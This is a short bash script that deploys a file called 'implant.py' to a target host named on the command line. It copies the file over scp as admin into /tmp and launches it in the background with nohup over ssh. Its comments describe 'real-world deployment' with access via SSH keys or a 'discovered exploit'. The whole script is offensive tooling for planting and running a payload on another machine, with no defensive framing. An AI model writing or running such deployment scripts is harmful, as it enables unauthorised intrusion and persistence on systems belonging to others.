#!/bin/bash
# Real-world deployment: Transferring the implant to a target host
# Target host access via SSH keys or discovered exploit
TARGET_HOST=$1
scp implant.py admin@$TARGET_HOST:/tmp/
ssh admin@$TARGET_HOST "nohup python3 /tmp/implant.py &"
